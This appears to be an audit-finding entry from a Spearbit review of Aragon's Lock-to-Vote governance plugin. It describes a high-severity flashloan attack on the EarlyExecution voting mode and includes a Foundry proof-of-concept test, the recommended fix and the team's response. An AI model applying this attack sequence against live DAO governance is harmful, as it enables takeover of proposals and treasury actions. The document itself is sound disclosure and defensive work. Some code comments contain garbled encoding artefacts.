---
tags:
  - lang/solidity
  - sector/governance
  - sector/lending
  - sector/token
  - platform/spearbit
  - has/github
  - has/poc
  - severity/high
  - trigger/flash-loan
  - precondition/flash-loan-available
protocol: "[[Aragon]]"
auditors:
  - "[[Om Parikh]]"
report: "https://github.com/spearbit/portfolio/blob/master/pdfs/Aragon-Spearbit-Security-Review-July-2025.pdf"
genome:
  - "[[flash-loan-attack]]"
  - "[[role-bypass]]"
  - "[[flash-loan]]"
  - "[[flash-loan-available]]"
  - "[[flashloan-callback-auth]]"
  - "[[proposal-state-check]]"
---
# Proposals created with voting mode EarlyExecution are vulnerable to ﬂashloan attacks

- id: 62256
- impact: HIGH
- protocol: [[Aragon]] DAO Gov Plugin
- reporter: Om Parikh (Spearbit)
- source: https://github.com/spearbit/portfolio/blob/master/pdfs/Aragon-Spearbit-Security-Review-July-2025.pdf

## Summary


This bug report discusses a high-risk issue related to the LockManager token used by the Aragon platform. The issue allows anyone to "early execute" a proposal in the voting mode `EarlyExecution` by performing a series of actions. The report includes a proof of concept code and recommends a possible solution to prevent this issue from occurring. The Aragon team has fixed the issue in their PR 26 and acknowledges the potential impact on user experience. They are moving forward with the fix and acknowledge the feedback regarding the potential degradation of user experience.

## Details

## Severity: High Risk

## Context
(No context files were provided by the reviewer)

## Description
If the token used by the LockManager can be flashloaned (or flashminted) and a proposal is created with the voting mode `EarlyExecution`, anyone could be able to "early execute" it performing the following actions:

- Flashloan the needed amount.
- Lock the flashloaned amount.
- Cast a "YES" vote and trigger the "early execute" logic.
- Unlock the tokens.
- Repay the flashloan.

## Proof of Concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import {TestBase} from "./lib/TestBase.sol";
import {DaoBuilder} from "./builders/DaoBuilder.sol";
import {DAO} from "@aragon/osx/src/core/dao/DAO.sol";
import {Action} from "@aragon/osx-commons-contracts/src/executors/IExecutor.sol";
import {LockToVotePlugin, MajorityVotingBase} from "../src/LockToVotePlugin.sol";
import {IMajorityVoting} from "../src/interfaces/IMajorityVoting.sol";
import {LockManagerERC20} from "../src/LockManagerERC20.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {TestToken} from "./mocks/TestToken.sol";
import "forge-std/console.sol";

contract SVoteFlashloanTest is TestBase {
    DaoBuilder builder;
    DAO dao;
    LockToVotePlugin ltvPlugin;
    LockManagerERC20 lockManager;
    IERC20 lockableToken;
    uint256 proposalId;
    
    // Default actions for proposal creation
    Action[] internal actions;

    event ProposalExecuted(uint256 indexed proposalId);

    function setUp() public {}

    function _init(MajorityVotingBase.VotingMode _votingMode) internal {
        builder = new DaoBuilder();
        (dao, ltvPlugin, lockManager, lockableToken) = builder.withVotingPlugin().withVotingMode(_votingMode).build();
    }

    function testFlashLoanVote() public {
        _init(MajorityVotingBase.VotingMode.EarlyExecution);
        
        // give alice the proposer permission to make it simple
        dao.grant(address(ltvPlugin), alice, ltvPlugin.CREATE_PROPOSAL_PERMISSION_ID());
        
        // NOTE: I need to provide the permission to the LockManager instead of Alice because
        // /grave.ts1vote/grave.ts1is passing /grave.ts1msg.sender/grave.ts1(the lock manager) to /grave.ts1_attemptEarlyExecution/grave.ts1instead of the actual voter address
        dao.grant(address(ltvPlugin), address(lockManager), ltvPlugin.EXECUTE_PROPOSAL_PERMISSION_ID());
        
        vm.prank(alice);
        proposalId = ltvPlugin.createProposal("0x", new Action[](0), 0, 0, abi.encode(uint256(0)));
        
        // flashloan to alice just enough token to make the proposal pass and execute it
        _flashloan(address(lockableToken), alice, 10e18);
        
        // approve the token to be locked
        vm.prank(alice);
        lockableToken.approve(address(lockManager), 10e18);
        
        // lock and vote the Yes
        // check that the proposal has been executed by expecting the /grave.ts1ProposalExecuted/grave.ts1event
        vm.expectEmit();
        emit ProposalExecuted(proposalId);
        vm.prank(alice);
        lockManager.lockAndVote(proposalId, IMajorityVoting.VoteOption.Yes, 10e18);
        
        // alice has not more token, everything has been temporarily locked in the lock manager
        assertEq(lockableToken.balanceOf(alice), 0);
        
        // alice can unlock and withdraw everything because the proposal has been auto-executed by her vote
        vm.prank(alice);
        lockManager.unlock();
        
        // alice got all her 10e18 token back and can repay the 1000 token flashloan
        assertEq(lockableToken.balanceOf(alice), 10e18);
    }

    function _flashloan(address token, address user, uint256 amount) internal {
        TestToken(token).mint(user, amount);
    }
}
```

## Recommendation
One possible path to be further evaluated is to avoid allowing the early execution in the very same block that the vote has been made. This would require tracking the "success" of a proposal in a separate flag, stored in the proposal struct.

If the flag is true (or the voting period has ended and the existing success logic passes), the proposal can be executed. This new flag and block requirement needs to be integrated across the existing logic in all the functions like `canVote`, `canExecute`, `hasSucceeded`, `_isProposalOpen`, and so on.

Note that these are suggestions that could lead to side effects and need to be further properly evaluated from a security standpoint.

## Aragon
Fixed in PR 26.

## Spearbit
The issue has been resolved with the PR 26.

As previously mentioned, by removing the `EarlyExecution` voting mode, users won't be able to "withdraw" their vote and unlock them before all the proposals they have voted in have ended (voting period has ended). This is not a "security issue" because it follows the intended behavior of the "Standard Voting Mode", but it could create a UX issue because no one will be willing to vote on multiple proposals or will "wait" until the very end of the proposal voting period to lock their token only for the smallest amount of time (just to make a couple of examples).

Unless tokens are valueless (can't be traded), users could want to avoid locking their token and losing money. This will lead, as explained above, to voting behaviors that will make the proposal experience quite worse.

## Aragon Feedback
Agree with your feedback. However, the early execution mode was something we inherited from our existing plugins and in this context we see it more as a risk than as an asset. Even if the UX is impacted, and even if there could be a way to execute on the next block, we prefer being extra safe here. As mentioned, the likelihood of early execution is very, very low from our experience. So the impact of removing this mode should be close to nothing.

- We are removing the lingering appearances of "early" that weren't removed yet.
- We are going ahead with the PR that you verified.
- We acknowledge the feedback regarding the UX degradation.
